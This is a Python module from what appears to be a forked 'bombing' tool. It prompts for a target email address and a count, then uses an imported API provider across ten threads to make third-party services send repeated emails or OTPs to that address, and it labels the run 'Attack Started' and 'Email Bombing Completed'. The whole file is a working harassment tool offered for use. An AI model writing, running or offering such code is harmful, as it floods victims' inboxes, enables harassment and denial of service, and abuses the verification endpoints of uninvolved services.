"""
Original Author : https://github.com/karthi-the-hacker
Fork Author     : https://github.com/minefarts
"""
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor, as_completed
from AttackModes.provider import APIProvider
from rich.console import Console
from rich.panel import Panel
import re

console = Console()

def email_banner():
    console.print(Panel.fit(
        "📲 [bold green]Email Bombing[/bold green]",
        border_style = "red"
    ))

def input_instructions():
    console.print(Panel.fit(
        
        "[bold yellow]Instructions[/bold yellow]\n\n"
        "👉 Enter Email Id (e.g. test@email.com)\n"
        "👉 Enter number of Email to send max 100\n"
        "❌ Enter [red]'x'[/red] to exit anytime",
        
        border_style = "magenta"
    ))

def get_otp_count():
    while True:

        user_input = input("📲 Enter number of email to send (10-100): ").strip()
        
        if user_input.lower() == 'x':
            return "exit"

        if not user_input.isdigit():
            console.print("[bold red]❌ Invalid input. Please enter a number.[/bold red]")
            continue

        count = int(user_input)

        if count < 10 or count > 100:
            console.print("[bold red]❌ Please enter a number between 10 and 100.[/bold red]")
            continue

        return count

def get_emailid():
    while True:

        email = input("📧 Enter Email Address (type 'x' to exit): ").strip()        
        
        if email.lower() == 'x':
            return "exit"
        
        if re.fullmatch(r"[^@ \t\r\n]+@[^@ \t\r\n]+\.[^@ \t\r\n]+", email):
            return email
        
        else:
            console.print("[bold red]❌ Invalid email format. Please enter a valid email address.[/bold red]")

def getio():

    email_banner()

    input_instructions()

    emailid = get_emailid()
    if emailid == "exit": 
        return None
    
    otpcount = get_otp_count()
    if otpcount == "exit": 
        return None
    
    return emailid, otpcount

def sendotp(emailid, otpcount):

    console.print(Panel.fit(
        
        "[bold yellow]🚀 Attack Started[/bold yellow]\n\n"
        f"👉 Email Id: {emailid}\n"
        f"👉 Email count: {otpcount}\n",
        
        border_style = "magenta"
    ))

    api = APIProvider("in", emailid, "mail", delay=1)

    success, failed = 0, 0

    progress = Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=None),
        "[progress.percentage]{task.percentage:>3.0f}%",
        TimeElapsedColumn(),
        console=console,
        transient=True
    )

    with progress:

        task = progress.add_task(
            "[cyan]Sending Emails...",
            total = otpcount
        )

        while success < otpcount:
            with ThreadPoolExecutor(max_workers=10) as executor:
                
                jobs = [executor.submit(api.hit) for _ in range(otpcount - success)]

                for job in as_completed(jobs):
                
                    result = job.result()
                    if result is None:
                        print("❌ Try again later")
                        input("🔙 Enter 0 to return main menu...")
                        return
                
                    if result:
                        success += 1
                        progress.advance(task)
                
                    else:
                        failed += 1

    input("\n✅ Email Bombing Completed!\n\n🔙 Enter 0 to return to the main menu: ")

    return emailid, otpcount